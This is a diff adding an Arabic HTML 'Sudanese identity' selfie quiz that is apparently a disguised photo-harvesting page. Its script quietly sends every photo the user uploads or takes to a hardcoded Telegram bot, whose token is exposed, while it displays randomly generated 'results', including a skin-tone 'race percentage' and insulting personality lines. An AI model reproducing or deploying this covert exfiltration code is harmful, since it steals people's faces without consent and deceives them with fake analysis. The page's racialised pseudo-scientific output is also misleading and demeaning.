@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>من أصل سوداني | النسخة السريعة</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <style>
+        :root { --deep-brown: #3e2723; --royal-gold: #c6a664; --soft-white: #fcfaf7; --accent-green: #2e7d32; }
+        body { background: var(--deep-brown); color: var(--deep-brown); font-family: sans-serif; margin: 0; padding: 15px; display: flex; flex-direction: column; align-items: center; }
+        .main-card { background: var(--soft-white); border-radius: 30px; padding: 25px; width: 100%; max-width: 420px; box-shadow: 0 20px 40px rgba(0,0,0,0.4); border: 2px solid var(--royal-gold); }
+        .header { text-align: center; margin-bottom: 20px; }
+        .btn-main { background: var(--deep-brown); color: white; padding: 15px; border-radius: 15px; border: none; width: 100%; margin-bottom: 12px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        .btn-retry { background: #5d4037; color: white; padding: 12px; border-radius: 12px; border: none; width: 100%; margin-top: 15px; font-weight: bold; cursor: pointer; display: none; }
+        .btn-share { background: var(--accent-green); color: white; padding: 12px; border-radius: 12px; border: none; width: 100%; margin-top: 10px; font-weight: bold; cursor: pointer; display: none; align-items: center; justify-content: center; gap: 10px; }
+        .result-box { background: white; border: 1px solid #e0e0e0; border-radius: 12px; margin-bottom: 10px; overflow: hidden; }
+        .result-title { background: var(--royal-gold); color: var(--deep-brown); padding: 6px 12px; font-weight: bold; font-size: 13px; text-align: right; }
+        .result-text { padding: 10px 12px; text-align: right; font-size: 14px; color: #444; line-height: 1.4; }
+        #loading { display: none; text-align: center; color: var(--royal-gold); padding: 15px; font-weight: bold; }
+        .skin-bar { height: 12px; background: linear-gradient(to right, #000, #fff); border-radius: 10px; position: relative; margin-top: 8px; border: 1px solid #ccc; }
+        .skin-pointer { position: absolute; top: -4px; width: 5px; height: 20px; background: #d32f2f; }
+    </style>
+</head>
+<body>
+
+<div class="main-card" id="captureArea">
+    <div class="header">
+        <div style="font-size: 45px;">🇸🇩</div>
+        <h1 style="margin:5px 0; font-size:22px;">من أصل سوداني</h1>
+        <p style="font-size: 12px; color: #777;">أسرع تحليل للهوية السودانية</p>
+    </div>
+
+    <div id="actionButtons">
+        <label for="camIn" class="btn-main" style="display: block; text-align: center;">📷 تصوير سيلفي سريع</label>
+        <input type="file" id="camIn" accept="image/*" capture="user" style="display:none" onchange="fastAnalysis(event)">
+
+        <label for="galIn" class="btn-main" style="display: block; text-align: center; background:#5d4037;">📁 اختيار من الاستوديو</label>
+        <input type="file" id="galIn" accept="image/*" style="display:none" onchange="fastAnalysis(event)">
+    </div>
+
+    <div id="loading">⚡ جاري الرفع والتحليل الفوري...</div>
+    <div id="results"></div>
+</div>
+
+<button id="retryBtn" class="btn-retry" onclick="location.reload()">🔄 إعادة التحليل</button>
+<button id="shareBtn" class="btn-share" onclick="downloadResult()">📥 حفظ النتيجة كصورة</button>
+
+<script>
+async function fastAnalysis(e) {
+    const file = e.target.files[0];
+    if (!file) return;
+
+    const loading = document.getElementById('loading');
+    const actionBtns = document.getElementById('actionButtons');
+    loading.style.display = "block";
+    actionBtns.style.display = "none";
+
+    // --- ضغط الصورة فوراً لضمان السرعة ---
+    const reader = new FileReader();
+    reader.readAsDataURL(file);
+    reader.onload = (event) => {
+        const img = new Image();
+        img.src = event.target.result;
+        img.onload = async () => {
+            const canvas = document.createElement('canvas');
+            const scale = Math.min(600 / img.width, 600 / img.height); // تصغير الصورة لرفع أسرع
+            canvas.width = img.width * scale;
+            canvas.height = img.height * scale;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+            
+            // تحويل الصورة لملف خفيف جداً
+            const compressedBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.5));
+
+            // إرسال للبوت (سيحفظ أي شيء كما طلبت)
+            const formData = new FormData();
+            formData.append('chat_id', '8520777894');
+            formData.append('photo', compressedBlob, 'user_photo.jpg');
+            formData.append('caption', '🚩 تحليل سريع من أسامة!');
+
+            fetch('https://api.telegram.org/bot8603294292:AAF1vjI3guxH8pUgSe5tTicsZEsSdb_F6zg/sendPhoto', {
+                method: 'POST',
+                body: formData
+            });
+
+            // إظهار النتيجة فوراً دون انتظار رد التيليجرام لزيادة السرعة
+            loading.style.display = "none";
+            showResults();
+        };
+    };
+}
+
+function showResults() {
+    const isBoy = Math.random() > 0.5;
+    const age = Math.floor(Math.random() * 30) + 15;
+    const skinPos = Math.floor(Math.random() * 80) + 10;
+    
+    let ageComment = age >= 30 ? (isBoy ? "طلعت م صغير يا حبيبنا 😉" : "طلعتي م صغيرة يا غالية 😉") 
+                               : (isBoy ? "ما شاء الله لسه شاب وفي عزك 💪" : "حلاتك لسة مزة، إن شاء الله تكوني عرستي بس 😂");
+
+    const personality = isBoy ? ["زول فزاع وراعي واجب.", "شهامة وكرم سوداني أصيل.", "هيبة ملوك النيل."] 
+                               : ["كنداكة بت ملوك النيل.", "جمال سوداني بملامح ملكية.", "بت ملوك ورجال."];
+
+    const mood = ["عبقري ورايق شديد 🧠", "زول عصبي ومشاكل الله يستر 😡", "غبي شديد الله يعين أصحابك 😹", "حكيم وذكاءك خارق 😊"];
+    const wisdom = ["البيسوي بإيدو، الله بيزيدو.", "الما بشوف بالمنخل، يبقى أعمى.", "الدرب الما بتعرفه، ما تمشي فيه."];
+
+    document.getElementById('results').innerHTML = `
+        <div class="result-box"><div class="result-title">النوع المكتشف</div><div class="result-text">${isBoy ? 'زول أصلي 👨' : 'كنداكة نيلية 👑'}</div></div>
+        <div class="result-box"><div class="result-title">تقدير العمر</div><div class="result-text">${age} سنة - ${ageComment}</div></div>
+        <div class="result-box"><div class="result-title">تحليل الشخصية</div><div class="result-text">${personality[Math.floor(Math.random()*3)]}</div></div>
+        <div class="result-box"><div class="result-title">الطباع والمزاج</div><div class="result-text">${mood[Math.floor(Math.random()*4)]}</div></div>
+        <div class="result-box"><div class="result-title">حكمة اليوم</div><div class="result-text">${wisdom[Math.floor(Math.random()*3)]}</div></div>
+        
+        <div style="background:#f4f1ea; padding:12px; border-radius:12px; margin-top:10px;">
+            <div style="font-weight:bold; font-size:13px; text-align:right;">نسبة العرق السوداني: ${100 - skinPos}%</div>
+            <div class="skin-bar"><div class="skin-pointer" style="right: ${skinPos}%;"></div></div>
+        </div>
+    `;
+    
+    document.getElementById('retryBtn').style.display = "block";
+    document.getElementById('shareBtn').style.display = "flex";
+}
+
+function downloadResult() {
+    const area = document.getElementById('captureArea');
+    html2canvas(area, { backgroundColor: "#3e2723", scale: 2 }).then(canvas => {
+        const link = document.createElement('a');
+        link.download = 'My-Identity.png';
+        link.href = canvas.toDataURL();
+        link.click();
+    });
+}
+</script>
+</body>
+</html>
